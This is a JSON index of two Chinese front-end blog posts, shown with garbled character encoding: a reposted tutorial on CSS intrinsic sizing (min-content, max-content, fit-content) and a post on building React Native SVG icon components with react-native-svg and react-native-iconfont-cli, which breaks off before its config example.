[{"title":"ã€è½¬è½½ã€‘CSS å†…åœ¨å°ºå¯¸æ•™ç¨‹ï¼ˆmin-contentã€max-content å’Œ fit-content ï¼‰","path":"/2023/03/02/23c511e540c1/","content":"åŸæ–‡é“¾æ¥ï¼šIntrinsic Sizing In CSSï¼Œby Ahmad Shadeed CSS ä¸­å­˜åœ¨ä¸¤ç§å°ºå¯¸ï¼šå†…åœ¨å°ºå¯¸ï¼ˆintrinsicï¼‰å’Œå¤–åœ¨å°ºå¯¸ï¼ˆextrinsicï¼‰ã€‚ä¸ºå…ƒç´ çš„ widthã€height è®¾ç½®çš„å›ºå®šå±æ€§å€¼ï¼Œå°±æ˜¯æŒ‡å¤–éƒ¨å°ºå¯¸ï¼Œè¿™æ˜¯æœ€å¸¸ç”¨çš„æ–¹å¼ã€‚è€Œå†…éƒ¨å°ºå¯¸ï¼Œåˆ™æ˜¯ç”±å…ƒç´ åŒ…å«çš„å†…å®¹é‡å†³å®šçš„ã€‚æœ¬ç¯‡å°†ä¼šè¯¦ç»†ä»‹ç»æ§åˆ¶å†…åœ¨å°ºå¯¸çš„æ¯ä¸ªå€¼ï¼Œçœ‹çœ‹å®ƒä»¬çš„ä½¿ç”¨èƒ½å¸¦æ¥ä»€ä¹ˆå¥½å¤„ã€‚åŒæ—¶ï¼Œæˆ‘è¿˜ä¼šä¸¾ä¾‹è¯´æ˜è¿™äº›å€¼ä¸ CSS Grid å¸ƒå±€&#x2F;å…¶ä»–å±æ€§å¦‚ä½•ç»“åˆä½¿ç”¨ã€‚ å¤–åœ¨å°ºå¯¸å¤–åœ¨å°ºå¯¸æ˜¯æŒ‡ç”¨ç²¾ç¡®çš„å€¼æŒ‡å®šå…ƒç´ å°ºå¯¸ã€‚ä¸¾ä¸ªä¾‹å­ï¼šè¿™ä¸ªæŒ‰é’®çš„å°ºå¯¸æ˜¯ 100pxï¼Œè¿™å°±æ˜¯å¤–åœ¨å°ºå¯¸äº†ã€‚å†æ¯”å¦‚ä¸€ä¸ª å…ƒç´ ï¼Œå®ƒé»˜è®¤æ˜¯ä¸ªå—çº§å…ƒç´ ï¼Œå°±æ˜¯è¯´å®ƒçš„å®½é»˜è®¤ç­‰äº 100% çˆ¶å…ƒç´ çš„å®½ã€‚æœ‰æ—¶ï¼Œæˆ‘ä»¬æƒ³è¦æ ¹æ®å…ƒç´ å®é™…çš„å†…å®¹æ¥è®¾ç½®å°ºå¯¸ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œä½¿ç”¨å¤–åœ¨å°ºå¯¸å°±æ²¡æœ‰ç”¨äº†ã€‚æ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬æ¥çœ‹çœ‹å¦‚ä½•æ˜¯ç”¨å†…åœ¨å±æ€§å€¼æ¥è§£å†³é—®é¢˜çš„å§ï¼ min-contentmin-content å€¼è¡¨ç¤ºå†…åœ¨æœ€å°å®½åº¦ï¼ˆè¯‘æ³¨ï¼šè¿™é‡Œè¯´çš„ä¸å‡†ç¡®ï¼Œä¹Ÿå¯ä»¥æ˜¯â€œæœ€å°é«˜åº¦â€ï¼Œå› æ­¤åº”è¯¥ç§°ä¸ºâ€œæœ€å°å°ºå¯¸â€ï¼‰ï¼Œå®ƒç­‰äºå…ƒç´ å†…å®¹é‡Œæœ€é•¿çš„é‚£ä¸ªå•è¯å®½åº¦ã€‚CSS Working Group (CSSWG) çš„è¯´æ³•æ˜¯ï¼šThe inline size that would fit around its contents if all soft wrap opportunities within the box were taken.å¦ç‡åœ°è®²ï¼Œæˆ‘å¤ªç†è§£ CSSWG å…³äºè¿™ä¸ªæ¦‚å¿µçš„å®šä¹‰ã€‚æˆ‘è‡ªå·±æ˜¯è¿™ä¹ˆç†è§£çš„ï¼šæˆ‘åœ¨å…ƒç´ çš„å‘¨å›´åŒ…è£¹äº†ä¸€ä¸ªæ¡†ï¼Œå…ƒç´ å†…å®¹ï¼ˆå¾ˆå¤šå•è¯ï¼‰ä¼šå› æ­¤è€ŒæŠ˜è¡Œï¼Œè¿™ä¸ªæ¡†çš„å®½åº¦å°†ç­‰äºå…ƒç´ ä¸­æœ€é•¿çš„é‚£ä¸ªå•è¯ã€‚å¦‚æœæˆ‘è¿™é‡Œè¡¨è¿°æœ‰è¯¯çš„è¯ï¼Œå¸Œæœ›å¤§å®¶æ¥æ›´æ­£ã€‚ä¸¾ä¸€ä¸ªä¾‹å­ï¼Œæœ‰ä¸€ä¸ªæ ‡é¢˜å…ƒç´ ï¼šå¤§å®¶å¯ä»¥çœ‹è§ï¼Œå½“å…ƒç´ çš„ width è®¾ç½®æˆ min-content åï¼Œå…¶å®½åº¦ç­‰äºæœ€é•¿å•è¯çš„å®½åº¦ï¼Œä¹Ÿå°±æ˜¯è¿™é‡Œçš„â€œawesomeâ€ã€‚A pen byÂ AhmadÂ Shadeed max-contentmax-content è¡¨ç¤ºå…ƒç´ çš„å†…åœ¨é¦–é€‰å®½åº¦ï¼ˆintrinsic preferred widthï¼‰ï¼Œå®ƒç­‰äºå…ƒç´ å†…å®¹çš„å®½ã€‚è¿˜ä¸¾ä¸€ä¸ªæ ‡é¢˜å…ƒç´ çš„ä¾‹å­ï¼Œä¸è¿‡è¿™æ¬¡æ”¹ç”¨ max-content äº†ï¼š æ³¨æ„è§‚å¯Ÿï¼Œå…ƒç´ å®½åº¦ç­‰äºæ ‡é¢˜å®½åº¦äº†ã€‚è¿™ä¸ªå®½åº¦æ˜¯åŠ¨æ€çš„ï¼Œéšç€æ ‡é¢˜å†…å®¹çš„æ”¹å˜ï¼Œmax-content æ‰€ä»£è¡¨çš„å€¼ä¹Ÿç›¸åº”æ”¹å˜ã€‚ fit-cotentè¿™ä¸ªå±æ€§å¯ä»¥çœ‹æˆæ˜¯ min-content å’Œ max-content çš„ç»“åˆã€‚æœç´¢çš„æ—¶å€™ï¼Œæˆ‘å‘ç° Stackoverflow ä¸Šçš„è¿™ä¸ªå›ç­”æˆ‘å¾ˆå–œæ¬¢ï¼šfit-content é»˜è®¸ä½¿ç”¨ max-contentï¼›å¦‚æœ available &lt; max-contentï¼Œé‚£å°±ä½¿ç”¨ availableï¼›å¦‚æœ available &lt; min-contentï¼Œé‚£å°±ä½¿ç”¨ min-contentã€‚ç”»ä¸€ä¸ªæµç¨‹å›¾è¡¨ç¤ºï¼Œå°±æ˜¯ä¸‹é¢è¿™æ ·çš„ï¼šæ³¨æ„ï¼Œè¿™é‡Œçš„â€œavailableâ€è¡¨ç¤ºå…ƒç´ åœ¨è§†å£ä¸­çš„å¯ç”¨ç©ºé—´ã€‚ ğŸ¤” è¯‘æ³¨ä¸Šé¢çš„æµç¨‹å›¾è·Ÿ Stackoverflow ä¸Šçš„å›ç­”æ¯”èµ·æ¥ï¼Œå¹¶ä¸ååˆ†æ¸…æ™°ï¼Œåè€Œæ˜¯åè€…æ›´å®¹æ˜“ç†è§£èµ·æ¥ã€‚å…³äº Stackoverflow ä¸Šçš„å›ç­”æˆ‘çš„ç†è§£å¦‚ä¸‹ï¼š fit-content å±æ€§åˆ°åº•å–ç”¨ä½•å€¼ï¼Œè·Ÿå½“å‰å…ƒç´ çš„å¯ç”¨ç©ºé—´ï¼ˆavailableï¼‰æ˜¯ç´§å¯†ç›¸å…³çš„ã€‚ å¦‚æœå¯ç”¨ç©ºé—´å……è¶³ï¼Œé‚£å°±ç”¨ä½ å…ƒç´ çš„ max-conetnt åˆä½•å¦¨ï¼Œåæ­£å¤Ÿè£…ä½ çš„ã€‚ å¦‚æœå¯ç”¨ç©ºé—´ä¸å¤Ÿå……è£•ï¼Œæ¯” max-conetnt å°ç‚¹ï¼Œé‚£å°±å¾—ç”¨å¯ç”¨ç©ºé—´çš„å€¼äº†ï¼Œè¿™æ‰æ˜¾å¾—åˆé€‚ï¼ˆfitï¼‰ï¼Œä¸ä¼šå¯¼è‡´å†…å®¹è¶Šç•Œã€‚ å¦‚æœå¯ç”¨ç©ºé—´å¾ˆå°‘ï¼Œç”šè‡³æ¯” min-conetnt è¿˜å°ï¼Œé‚£ä¸å¥½æ„æ€ï¼Œå¾—ç”¨ min-content äº†ï¼Œä¸ç„¶æ˜¾ç¤ºä¼šå¾ˆéš¾çœ‹ï¼Œå°±ä¸åˆé€‚äº†ã€‚ è®©æˆ‘ä»¬ä¸¾ä¸ªä¾‹å­çœ‹çœ‹å®ƒæ˜¯å¦‚ä½•å·¥ä½œçš„ã€‚æŸ¥çœ‹ä¸‹é¢çš„ GIF å›¾ï¼Œè§‚å¯Ÿæ ‡é¢˜å°ºå¯¸æ˜¯å¦‚ä½•éšç€è§†å£çš„å˜åŒ–åšè°ƒæ•´çš„ã€‚æˆ‘ä»¬å†å›é¡¾ä¸€ä¸‹å…³äº fit-content çš„çŸ¥è¯†ï¼šå¦‚æœå½“å‰çš„å¯ç”¨ç©ºé—´æ¯” max-content è¿˜å¤§çš„è¯ï¼Œwidth å°±ç­‰äº max-contentï¼›å¦‚æœå¯ç”¨ç©ºé—´æ¯” max-content çš„å°çš„è¯ï¼Œé‚£ä¹ˆ width å°±ç­‰äºå¯ç”¨ç©ºé—´çš„å®½äº†ï¼›æœ€åï¼Œå¦‚æœå¯ç”¨ç©ºé—´æ¯” min-content è¿˜å°ï¼Œé‚£ä¹ˆ width å°±ç­‰äº min-contentã€‚åˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘è§£é‡Šå®Œäº†æ¯ä¸€ä¸ªå†…åœ¨å€¼ã€‚è®©æˆ‘ä»¬è½¬å‘çœŸå®çš„æ¡ˆä¾‹æ¥çœ‹ä¸‹å§ã€‚ ä½¿ç”¨æ¡ˆä¾‹ å’Œ ç°åœ¨æˆ‘ä»¬å‡è®¾æœ‰ä¸€ä¸ªå¸¦ çš„ ï¼Œå› ä¸ºå®ƒæ˜¯ä¸ªå—çº§å…ƒç´ ï¼Œå› æ­¤é»˜è®¤ç­‰äº 100% çˆ¶å…ƒç´ å®½åº¦çš„ã€‚æˆ‘ä»¬é¢„æœŸçš„è¡Œä¸ºæ˜¯å¸Œæœ› åŒ…è£¹å›¾åƒçš„ï¼Œä½¿ç”¨ max-content å°±èƒ½å–å¾—è¿™äº›æ•ˆæœï¼Œè®© ä¸å†…å®¹ï¼ˆæœ€å¤§ï¼‰å®½åº¦ä¸€æ ·ã€‚ä½†æœ‰ä¸€ä¸ªé—®é¢˜ï¼Œå¦‚æœå›¾ç‰‡æ¯”è§†å£èŒƒå›´è¿˜å¤§çš„è¯ï¼Œè¿™æ—¶å› ä¸º çš„å®½åº¦å°±ç­‰äºå›¾ç‰‡çš„å®½åº¦ï¼Œå› æ­¤å°±ä¼šå¯¼è‡´æ°´å¹³æ»šåŠ¨æ¡çš„å‡ºç°ã€‚ä¸ºäº†è§£å†³è¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å°±è¦ä¸ºå›¾ç‰‡ä½¿ç”¨ fit-content äº†ã€‚å®ƒä¸ä¼šè®©å¤§å›¾ç‰‡è¶…å‡ºè§†å£ä¹‹å¤–æ˜¾ç¤ºã€‚A pen byÂ AhmadÂ Shadeed å¸¦åˆ†éš”ç¬¦çš„æ ‡é¢˜åœ¨è¿™ä¸ªä¾‹å­é‡Œï¼Œâ€œTop Storiesâ€è¦æŠ˜æˆä¸¤è¡Œæ˜¾ç¤ºã€‚å®½åº¦è¿˜æ˜¯åŠ¨æ€çš„ï¼Œå°±æ˜¯è¯´ä¸ç®¡å®é™…æ ‡é¢˜å¦‚ä½•ï¼Œéƒ½éœ€è¦æŠ˜è¡Œã€‚ä¸ºäº†å®ç°è¿™ä¸ªæ•ˆæœï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ min-contentã€‚A pen byÂ AhmadÂ Shadeed å¸¦ä¸‹åˆ’çº¿çš„æ ‡é¢˜å†…åœ¨å€¼çš„å¦ä¸€ä¸ªæœ‰è¶£çš„ç”¨ä¾‹æ˜¯å¸¦è¾¹æ¡†çš„æ ‡é¢˜ï¼Œè¦æ±‚è¾¹æ¡†è·Ÿæ ‡é¢˜å†…å®¹ä¸€æ ·é•¿ã€‚è€ƒè™‘ä¸‹å›¾ï¼šæ³¨æ„ï¼Œæ ‡é¢˜æ˜¯ä¸ªå—çŠ¶å…ƒç´ ã€‚ä¸ºäº†å¾—åˆ°ä¸Šè¿°çš„æ•ˆæœï¼Œä»¥å‰çš„åšæ³•æ˜¯å°†å†…å®¹åŒ…è£…åœ¨ æ ‡ç­¾é‡Œï¼Œç»™ è®¾ç½®è¾¹æ¡†æ•ˆæœã€‚å½“ç„¶ï¼Œæˆ‘ä»¬è¿˜å¯ä»¥å€ŸåŠ© fit-content æ¥è®©æ ‡é¢˜å®½åº¦ä¸å†…å®¹ä¸€æ ·é•¿ã€‚A pen byÂ AhmadÂ Shadeed å¯¼èˆªå¦‚æœä¸€ä¸ªé¡µé¢å¯¼èˆªçš„å®½åº¦æ˜¯åŸºäºå†…å®¹çš„ã€‚é‚£ä¹ˆï¼Œå¯ä»¥é€šè¿‡ä½¿ç”¨ max-contentï¼Œè½»æ¾å®ç°æ•ˆæœï¼šDemo Todo åˆ—è¡¨åœ¨ç½‘ä¸Šæ‰¾å†…åœ¨å€¼çš„ä½¿ç”¨æ¡ˆä¾‹çš„æ—¶å€™ï¼Œçœ‹åˆ°äº† ä¸€ç¯‡æ–‡ç« ï¼Œå°†æˆ‘å¸å¼•äº†ã€‚è€ƒè™‘ä¸‹é¢çš„ä¾‹å­ï¼šè¿™ä¸ª Todo åˆ—è¡¨åŒ…å«ï¼šé¡µçœ‰ã€åˆ—è¡¨å’Œé¡µè„šã€‚ä¸ç®¡æœ‰å¤šå°‘åˆ—è¡¨é¡¹ï¼Œä¸­é—´éƒ¨åˆ†çš„é«˜åº¦éƒ½åº”è¯¥æ˜¯ 100% - header - footerã€‚ä¸ºäº†å®ç°è¿™ä¸ªæ•ˆæœï¼Œæˆ‘ä»¬å¯ä»¥å°† CSS Grid ä¸ min-content æ­é…ä½¿ç”¨ã€‚ä½ å¯èƒ½æƒ³çŸ¥é“ï¼Œå¦‚æœæˆ‘ä»¬ä¸ä½¿ç”¨ min-contentï¼Œä¼šæ˜¯ä»€ä¹ˆç»“æœå‘¢ï¼Ÿå¥½å§ï¼Œæ¥çœ‹çœ‹ï¼š èŠå¤©çª—å£è®¾æƒ³æ„å»ºä¸€ä¸ªèŠå¤©ç¨‹åºã€‚åœ¨ä¸‹é¢çš„ç¤ºä¾‹é‡Œï¼Œå¸ƒå±€ç»“æ„ä¸ Todo åˆ—è¡¨éå¸¸ç›¸ä¼¼ã€‚å½“æ²¡æœ‰\\èŠå¤©è®°å½•ï¼Œå¹¶ä¸”æ²¡æœ‰ä½¿ç”¨ min-content æ—¶ï¼Œå°±ä¼šå¯¼è‡´å¸ƒå±€é­åˆ°ç ´åã€‚Demo Heroå‡è®¾æˆ‘ä»¬é¡µé¢ é‡ŒåŒ…å«ä¸€ä¸ª Hero ç»„ä»¶ã€‚æˆ‘ä»¬çš„ç›®æ ‡æ˜¯è®©è¿™ä¸ª Hero ç»„ä»¶å®ç°åŠ¨æ€å¸ƒå±€ï¼Œå æ®ä¸€å±é‡Œå‰©ä¸‹çš„ç©ºé—´ã€‚æœ‰ä¸¤è¡Œå†…å®¹ï¼Œç¬¬ä¸€è¡Œä½¿ç”¨çš„æ˜¯æœ€å°å†…å®¹é«˜åº¦ï¼Œè€Œç¬¬äºŒè¡Œåˆ™å¯ä»¥æ‰©å±•ã€å¡«å……å®Œå‰©ä¸‹çš„å¯ç”¨ç©ºé—´ã€‚A pen byÂ AhmadÂ Shadeed Sidebar å’Œ Mainæˆ‘æ€»æ˜¯æƒ³çŸ¥é“ä¸ºä»€ä¹ˆæˆ‘ä»¬éè¦ç»™ä¾§è¾¹æ ä¸€ä¸ªå›ºå®šå®½åº¦å‘¢ã€‚å¦‚æœå®ƒçš„å®½åº¦æ˜¯åŸºäºå†…å®¹çš„å‘¢ï¼Ÿæ¯”å¦‚è¯´ï¼Œå®ƒæœ‰ä¸€ä¸ªåŸºäºå†…å®¹çš„æœ€å°å®½åº¦å’Œä¸€ä¸ªæœ€å¤§å®½åº¦ï¼Ÿæˆ‘ä»¬æ¥è¯•è¯•ã€‚é€šè¿‡ä½¿ç”¨ CSS Grid fit-content å‡½æ•°ï¼Œæˆ‘ä»¬å¯ä»¥ç¡®ä¿ä¾§è¾¹æ çš„å®½åº¦ä¸ä¼šè¶…è¿‡ 150pxï¼Œå¹¶ä¸”å¯ä»¥åœ¨å†…å®¹å¾ˆçŸ­çš„æƒ…å†µä¸‹ç¼©å°åˆ° 150px ä»¥ä¸‹ã€‚å½“ä¾§è¾¹æ çš„å†…å®¹å¾ˆå°‘æ—¶ï¼Œå®ƒä¼šç¼©å°ä¸€ç‚¹ï¼š ğŸ¤” è¯‘æ³¨è¿™çš„ fit-content() æ–‡ä¸­å¹¶æ²¡æœ‰è®²åˆ°ã€‚å¯ä»¥è¿™æ ·ç®€å•ç†è§£ï¼šä¸€èˆ¬ä½¿ç”¨è¿™ä¸ªåŠŸèƒ½å‡½æ•°æ—¶ï¼Œæ‰€ç”¨å‚æ•°ä¸€èˆ¬éƒ½æ˜¯å°äºå…ƒç´ çš„ max-content å€¼çš„ã€‚æ¯”å¦‚ fit-content(150px)ï¼Œé‚£ä¹ˆè¯´ 150px æ˜¯å°äºå…ƒç´  max-content å€¼çš„ã€‚è¿™ç§æƒ…å†µä¸‹ï¼Œå…ƒç´ æœ€ç»ˆçš„æ¸²æŸ“å°ºå¯¸æ˜¯ä»‹äº min-content ~ 150px ä¹‹é—´çš„ã€‚å…·ä½“æ˜¯å¤šå°‘è¿˜è¦çœ‹å½“å‰çš„å¯ç”¨ç©ºé—´ï¼Œå¦‚æœå¯ç”¨ç©ºé—´å……è¶³ï¼Œæ‹¿å°±æ˜¾ç¤ºæœ€å¤§çš„ 150pxï¼Œå¦‚æœå¯ç”¨ç©ºé—´å°ï¼Œé‚£ä¹ˆå°±å– min-content ~ 150px ä¹‹é—´çš„æŸä¸ªå€¼ï¼Œå¦‚æœå¯ç”¨ç©ºé—´ä¸è¶³ï¼ˆæ¯” min-content è¿˜å°ï¼‰ï¼Œé‚£å°±ç”¨æœ€å°å€¼ min-contentï¼Œä¸èƒ½å†å°äº†ã€‚å½“ç„¶ï¼Œå¦‚æœ fit-content() é‡Œçš„å€¼æ¯”å…ƒç´  max-content è¿˜å¤§ï¼Œé‚£ä¹ˆå…ƒç´ æœ€ç»ˆçš„æ¸²æŸ“å°ºå¯¸æ˜¯ä»‹äº min-content ~ max-content ä¹‹é—´çš„ã€‚å…·ä½“æ˜¯å¤šå°‘è¿˜è¦çœ‹å½“å‰çš„å¯ç”¨ç©ºé—´ï¼Œä¸ä¸Šé¢ç±»ä¼¼ã€‚åæ­£ï¼Œfit-content() è¿”å›çš„æœ€å°å€¼æ˜¯ min-contentï¼Œä¸èƒ½æ¯” min-content æ›´å°äº†ã€‚æ›´å¤šä¿¡æ¯ï¼ŒæŸ¥çœ‹ MDN ä¸Šçš„ fit-content() æ–‡æ¡£ã€‚ æ ‡é¢˜å’Œæè¿°æˆ‘ä»¬æœ‰ä¸€ä¸ªæ ‡é¢˜å’Œä¸€ä¸ªæè¿°æ–‡æœ¬ã€‚æè¿°æ–‡å­—çš„å®½åº¦ä¸èƒ½è¶…è¿‡ä¸»æ ‡é¢˜çš„å®½åº¦ã€‚å¯¹æˆ‘æ¥è¯´ï¼Œè¿™æ˜¯ä¸€ä¸ªæœ‰è¶£çš„ç”¨ä¾‹ï¼Œæˆ‘ä»¥å‰è®¤ä¸ºå®ƒä¸å¯èƒ½ä»…ç”¨ CSS å°±èƒ½å®ç°ã€‚çœ‹ä¸‹ä¸‹é¢çš„æ¨¡å‹ã€‚ä¸ºäº†å®ç°ä¸Šè¿°åŠŸèƒ½ï¼Œæˆ‘ä»¬éœ€è¦å°† min-content è®¾ç½®ä¸ºåŒ…è£…å…ƒç´ çš„å®½åº¦ï¼Œè€Œä¸ºæ ‡é¢˜å…ƒç´ è®¾ç½® width: max-contentã€‚è¯·æ³¨æ„ï¼Œä¸Šé¢ä»£ç éœ€è¦åœ¨ç§»åŠ¨ç«¯åšäº›è°ƒæ•´é¢ï¼Œå¦åˆ™å¯èƒ½ä¼šå¯¼è‡´å¯¼è‡´æ°´å¹³æ»šåŠ¨æ¡çš„å‡ºç°ã€‚A pen byÂ AhmadÂ Shadeed æµè§ˆå™¨å…¼å®¹æ€§æ ¹æ® Can I Use æ•°æ®ï¼Œé™¤äº† Microsoft Edge (EdgeHTML) ä¹‹å¤–çš„æ‰€æœ‰ä¸»æµæµè§ˆå™¨éƒ½æ”¯æŒå†…åœ¨å€¼çš„è®¾ç½®äº†ã€‚æ³¨æ„ï¼šMicrosoft Edge (Chromium) ä»å‘å¸ƒçš„ç¬¬ä¸€ä¸ªç‰ˆæœ¬ï¼ˆ79ï¼‰å°±å·²ç»æ”¯æŒäº†ã€‚ï¼ˆæ­£æ–‡å®Œï¼‰ è½¬è½½è‡ªï¼šhttps://juejin.cn/post/6844904065692909576#heading-6","tags":["CSS"],"categories":["CSS"]},{"title":"React Native ç»„ä»¶åº“ - å›¾æ ‡ç»„ä»¶","path":"/2023/02/20/44cb562ca4b6/","content":"èƒŒæ™¯å›¾æ ‡ç»„ä»¶æ˜¯ç»„ä»¶åº“é‡Œä¸å¯æˆ–ç¼ºçš„ä¸€ä¸ªç»„ä»¶ï¼Œéšç€å‰ç«¯çš„ä¸æ–­å‘å±•ï¼Œå…¶å®ç°æ–¹å¼ä¹Ÿæ˜¯åœ¨ä¸æ–­çš„è¿­ä»£ï¼Œä»é›ªç¢§å›¾åˆ°å­—ä½“å›¾æ ‡å†åˆ° svg å›¾æ ‡ï¼Œå¹¶ä¸”å†é…åˆ Typescript å’Œ Tree Shaking å›¾æ ‡ç»„ä»¶ä¹Ÿèƒ½è½»æ¾çš„è·å¾—ä»£ç æç¤ºå’ŒæŒ‰éœ€åŠ è½½ã€‚ åœ¨ web ä¸­ä½¿ç”¨ svg å›¾æ ‡å¾ˆç®€å•ï¼Œæµè§ˆå™¨åŸç”Ÿæ”¯æŒ svg å…ƒç´ ï¼Œä½†æ˜¯ React Native å†…ç½®çš„ç»„ä»¶ä¸­æ²¡æœ‰ SVG ç»„ä»¶ï¼Œè¦ä½¿ç”¨ SVGï¼Œéœ€è¦è‡ªå·±å°è£…ã€‚å¹¸å¥½ç¤¾åŒºé‡Œæ—©æ—©æœ‰å¤§ä½¬å°è£…å¥½äº† - react-native-svgï¼Œæˆ‘ä»¬ç›´æ¥æ‹¿æ¥ä½¿ç”¨å°±å¥½äº†ã€‚ ä½¿ç”¨ react-native-svg å’Œæˆ‘ä»¬åœ¨ React ä¸­ä½¿ç”¨ svg å¾ˆåƒï¼Œéƒ½æœ‰ Svgã€Pathç»„ä»¶ï¼Œä¸è¿‡ä¸€ä¸ªæ˜¯åŸç”Ÿçš„ï¼Œä¸€ä¸ªéœ€è¦ä» react-native-svg ä¸­å¼•å…¥ï¼š React: 1234567891011import * as React from &quot;react&quot;;import &#123; SVGProps &#125; from &quot;react&quot;;const SvgComponent = (props: SVGProps&lt;SVGSVGElement&gt;) =&gt; ( &lt;svg width=&#123;48&#125; height=&#123;1&#125; xmlns=&quot;http://www.w3.org/2000/svg&quot; &#123;...props&#125;&gt; &lt;title&gt;&#123;&quot;Rectangle 5&quot;&#125;&lt;/title&gt; &lt;path d=&quot;M0 0h48v1H0z&quot; fill=&quot;#063855&quot; fillRule=&quot;evenodd&quot; /&gt; &lt;/svg&gt;);export default SvgComponent; React Nativeï¼š 1234567891011import * as React from &quot;react&quot;;import Svg, &#123; SvgProps, Path &#125; from &quot;react-native-svg&quot;;/* SVGR has dropped some elements not supported by react-native-svg: title */const SvgComponent = (props: SvgProps) =&gt; ( &lt;Svg width=&#123;48&#125; height=&#123;1&#125; xmlns=&quot;http://www.w3.org/2000/svg&quot; &#123;...props&#125;&gt; &lt;Path d=&quot;M0 0h48v1H0z&quot; fill=&quot;#063855&quot; fillRule=&quot;evenodd&quot; /&gt; &lt;/Svg&gt;);export default SvgComponent; åœ¨ React Native ä½¿ç”¨ svgï¼ŒåŸºæœ¬å°±ç›¸å½“äºæŠŠä»£ç ä» React ä¸­ copy è¿‡æ¥ï¼Œå°†æ‰€æœ‰çš„ svg å…ƒç´ æ¢æˆé©¼å³°æ ·å¼çš„è‡ªå®šä¹‰ç»„ä»¶ï¼Œç„¶åä» react-native-svg ä¸­å¼•å…¥ã€‚ è¿™é‡Œæ¨èä¸ªå·¥å…· SVGR Playgroundï¼Œå¯ä»¥å°† svg è½¬æ¢æˆ React &amp; React Native ç»„ä»¶ï¼Œçœå»æ‰‹åŠ¨ä¿®æ”¹çš„éº»çƒ¦ã€‚ å›¾æ ‡ç®¡ç†ä¸Šé¢ä»‹ç»äº†åœ¨ React Native ä¸­ä½¿ç”¨ svg å›¾æ ‡çš„å§¿åŠ¿ï¼Œä½†æ˜¯ä¸€ä¸ªå›¾æ ‡ç»„ä»¶åº“ä¸­ï¼Œå°‘åˆ™å‡ åå¤šåˆ™å‡ ç™¾ä¸ªå›¾æ ‡ï¼Œå¦‚ä½•ç®¡ç†è¿™äº›å›¾æ ‡å°±æ˜¯ä¸€ä¸ªé—®é¢˜äº†ã€‚ æœ€ç®€å•ç²—æš´çš„æ–¹å¼å°±æ˜¯ç›´æ¥æ”¾åœ¨æºç äº†ï¼Œä½†æ˜¯å½“ä½ éœ€è¦ä¿®æ”¹å’Œé¢„è§ˆå›¾æ ‡æ—¶ï¼Œä½ å°±ä¼šä½“éªŒåˆ°ä»€ä¹ˆåˆ°ç—›è‹¦ã€‚ æ›´å¥½çš„æ–¹å¼æ˜¯å€ŸåŠ©å›¾æ ‡ç®¡ç†å¹³å°ï¼Œæ¯”å¦‚ iconfontï¼Œiconpark ç­‰ï¼Œè¿™é‡Œæ¨è iconfontï¼ŒåŸå› è§ä¸‹é¢ï¼š å›¾æ ‡ç»„ä»¶ç”Ÿæˆå›¾æ ‡ç®¡ç†çš„é—®é¢˜è§£å†³äº†ï¼Œæ¥ä¸‹æ¥å°±è¦è§£å†³å¦‚ä½•å°† iconfont ä¸Šçš„å›¾æ ‡è½¬æ¢æˆå¯ä½¿ç”¨çš„å›¾æ ‡ç»„ä»¶çš„é—®é¢˜äº†ï¼Œè¿™é‡Œéœ€è¦å€ŸåŠ©ä¸ªå·¥å…· - react-native-iconfont-cliï¼Œè¿™é‡Œè´´ä¸‹ react-native-iconfont-cli éœ€è¦è§£å†³çš„ç—›ç‚¹ï¼Œä½“éªŒä¸‹å®ƒçš„å¼ºå¤§ä¹‹å¤„ï¼šå¼•ç”¨è‡ªï¼šhttps://github.com/iconfont-cli/react-native-iconfont-cli é€šå¸¸åœ°ï¼Œå½“æˆ‘ä»¬æƒ³åœ¨ RN é‡Œä½¿ç”¨ iconfontï¼Œæˆ‘ä»¬å¯èƒ½ä¼šå€ŸåŠ© react-native-vector-icons å¯¼å…¥ ttf å­—ä½“æ–‡ä»¶ï¼Œæˆ–è€…ç›´æ¥æ‰‹åŠ¨ä¸‹è½½å„ä¸ª svg æ–‡ä»¶åˆ°æœ¬åœ°ï¼Œç„¶åå•ä¸ªä½¿ç”¨ã€‚ä½¿ç”¨ ttf å­—ä½“æœ‰ä¸€ä¸ªå¼Šç«¯ï¼Œå°±æ˜¯æ¯æ¬¡æ›´æ–°å›¾æ ‡ï¼Œéƒ½è¦ç›¸åº”çš„æ›´æ–° ttf æ–‡ä»¶ï¼Œç„¶åå†æ¬¡æ‰“åŒ…å‘å¸ƒ APPã€‚è€Œä¸” ttf ä¸æ”¯æŒå¤šç§è‰²å½©çš„å›¾æ ‡ï¼Œå¯¼è‡´æ‰€æœ‰å›¾æ ‡éƒ½æ˜¯å•è‰²ã€‚å¦‚æœä½ æ˜¯å€ŸåŠ© react-native-vector-iconsï¼Œè¯¥åº“å†…ç½®äº† 10 å¤šå¥— ttf æ–‡ä»¶ï¼Œåˆèµ·æ¥æœ‰ 2M å·¦å³ï¼›ä½ å¯èƒ½ç”¨ä¸åˆ°å®ƒä»¬ï¼Œä½†æ˜¯å®ƒä»¬ä»ç„¶ä¼šè¢«æ‰“åŒ…è¿›ä½ çš„ APP é‡Œã€‚ä¸‹è½½ svg åˆ°æœ¬åœ°ä¹Ÿä¸æ–¹ä¾¿ï¼Œå› ä¸ºä½ éœ€è¦é¢å¤–ç»´æŠ¤ä¸€ä»½å›¾æ ‡å­—ä½“ï¼Œæœ‰å¯èƒ½é€ æˆçº¿ä¸Šå’Œæœ¬åœ°çš„å›¾æ ‡ä¸ä¸€è‡´é—®é¢˜ã€‚è€Œä¸”å¦‚æœä½ æƒ³åŠ¨æ€åœ°æ”¹å˜ svg çš„æ¸²æŸ“è‰²å½©ï¼ŒåŸºæœ¬ä¸Šæ˜¯ä¸å¯èƒ½çš„ï¼Œåªèƒ½æ¸²æŸ“åŸå›¾çš„é¢œè‰²ã€‚ ä¸ºäº†è§£å†³è¿™äº›é—®é¢˜ï¼Œæˆ‘ç”¨çº¯ Javascript å®ç° iconfont åˆ° React ç»„ä»¶çš„è½¬æ¢æ“ä½œï¼Œä¸éœ€è¦ä¾èµ– ttf å­—ä½“æ–‡ä»¶ï¼Œä¸éœ€è¦æ‰‹åŠ¨ä¸‹è½½å›¾æ ‡åˆ°æœ¬åœ°ã€‚ å¦‚ä½•ä½¿ç”¨å°±ä¸è¿‡å¤šä»‹ç»äº†ï¼ŒREADME é‡Œå†™çš„å¾ˆæ¸…æ¥šï¼Œè¿™é‡Œè´´ä¸‹æˆ‘çš„ç»„ä»¶åº“ä¸­ä½¿ç”¨çš„é…ç½®ï¼š 